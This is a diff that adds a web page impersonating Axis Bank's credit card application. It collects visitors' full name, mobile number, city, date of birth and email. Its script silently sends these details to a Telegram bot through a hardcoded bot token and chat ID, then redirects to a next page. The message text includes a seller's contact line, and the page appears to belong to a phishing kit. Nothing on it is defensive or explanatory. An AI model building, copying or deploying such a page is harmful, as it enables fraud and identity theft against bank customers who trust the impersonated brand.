@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Axis Bank </title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+/* BODY */
+
+body{
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(135deg,#4b001f,#7a1636,#9b2242);
+padding:30px;
+}
+
+/* HEADER */
+
+.top-header{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+padding:18px 35px;
+
+background:rgba(58,0,23,0.95);
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+
+backdrop-filter:blur(12px);
+
+box-shadow:0 5px 18px rgba(0,0,0,0.25);
+
+z-index:1000;
+}
+
+.logo{
+font-size:30px;
+font-weight:700;
+color:white;
+letter-spacing:1px;
+}
+
+.header-btn{
+padding:12px 24px;
+border:none;
+border-radius:14px;
+
+background:white;
+color:#7a1636;
+
+font-size:15px;
+font-weight:600;
+
+cursor:pointer;
+}
+
+/* FORM BOX */
+
+.form-box{
+width:100%;
+max-width:430px;
+
+background:white;
+
+padding:38px;
+
+border-radius:28px;
+
+margin-top:70px;
+
+box-shadow:
+0 20px 45px rgba(75,0,31,0.35);
+}
+
+/* TITLE */
+
+h2{
+text-align:center;
+margin-bottom:28px;
+color:#7a1636;
+font-size:32px;
+font-weight:700;
+}
+
+/* INPUT GROUP */
+
+.input-group{
+margin-bottom:18px;
+}
+
+/* LABEL */
+
+label{
+display:block;
+margin-bottom:8px;
+font-weight:600;
+color:#5a1029;
+}
+
+/* INPUT */
+
+input{
+width:100%;
+padding:15px;
+
+border-radius:14px;
+border:1px solid #d7b7c2;
+
+font-size:15px;
+
+outline:none;
+
+transition:0.3s;
+
+background:#fffafb;
+}
+
+input:focus{
+border-color:#8b1e46;
+
+box-shadow:
+0 0 10px rgba(139,30,70,0.18);
+}
+
+/* BUTTON */
+
+button.submit-btn{
+width:100%;
+padding:16px;
+
+border:none;
+border-radius:16px;
+
+background:
+linear-gradient(145deg,#8b1e46,#5a1029);
+
+color:white;
+
+font-size:17px;
+font-weight:600;
+
+cursor:pointer;
+
+margin-top:10px;
+
+box-shadow:
+0 8px 0 #3e0a1c,
+0 14px 24px rgba(0,0,0,0.25);
+
+transition:0.2s;
+}
+
+button.submit-btn:hover{
+
+transform:translateY(3px);
+
+box-shadow:
+0 4px 0 #3e0a1c,
+0 10px 18px rgba(0,0,0,0.2);
+}
+
+/* NOTE */
+
+.note{
+font-size:12px;
+color:#6b4b57;
+margin-top:15px;
+text-align:center;
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+.top-header{
+padding:15px 20px;
+}
+
+.logo{
+font-size:24px;
+}
+
+.form-box{
+padding:28px;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+
+<div class="top-header">
+
+<div class="logo">
+Axis Bank
+</div>
+
+
+
+</div>
+
+<!-- FORM -->
+
+<div class="form-box">
+
+<h2>Axis Bank Credit Card</h2>
+
+<form id="telegramForm">
+
+<div class="input-group">
+<label>Full Name</label>
+<input type="text" id="name" placeholder="Enter your name" required>
+</div>
+
+<div class="input-group">
+<label>Mobile Number</label>
+<input type="tel" id="mobile" placeholder="Enter mobile number" required>
+</div>
+
+<div class="input-group">
+<label>City</label>
+<input type="text" id="city" placeholder="Enter city" required>
+</div>
+
+<div class="input-group">
+<label>Date Of Birth</label>
+<input type="date" id="dob" required>
+</div>
+
+<div class="input-group">
+<label>Email Address</label>
+<input type="email" id="email" placeholder="Enter email" required>
+</div>
+
+<button type="submit" class="submit-btn">
+Submit Form
+</button>
+
+<div class="note">
+By submitting, you agree to share your information.
+</div>
+
+</form>
+
+</div>
+
+<script>
+
+document.getElementById("telegramForm").addEventListener("submit", function(e){
+
+e.preventDefault();
+
+let name = document.getElementById("name").value;
+let mobile = document.getElementById("mobile").value;
+let city = document.getElementById("city").value;
+let dob = document.getElementById("dob").value;
+let email = document.getElementById("email").value;
+
+/* TELEGRAM DETAILS */
+
+let botToken = "8212429787:AAHx8QHgnUWhcH4etbyU6ylxM7bwnunBXao";
+let chatId = "-1003446660471";
+
+let message =
+"New Form Submission 📍Contact For Website/Apps@PritamTolls%0A%0A" +
+"Name: " + name + "%0A" +
+"Mobile: " + mobile + "%0A" +
+"City: " + city + "%0A" +
+"DOB: " + dob + "%0A" +
+"Email: " + email;
+
+let url =
+"https://api.telegram.org/bot" +
+botToken +
+"/sendMessage?chat_id=" +
+chatId +
+"&text=" +
+message;
+
+fetch(url)
+.then(response => {
+
+/* OPEN PAGE2 */
+
+window.location.href = "3.pages.html";
+
+})
+.catch(error => {
+
+alert("Error submitting form");
+
+});
+
+});
+
+</script>
+
+</body>
+</html>
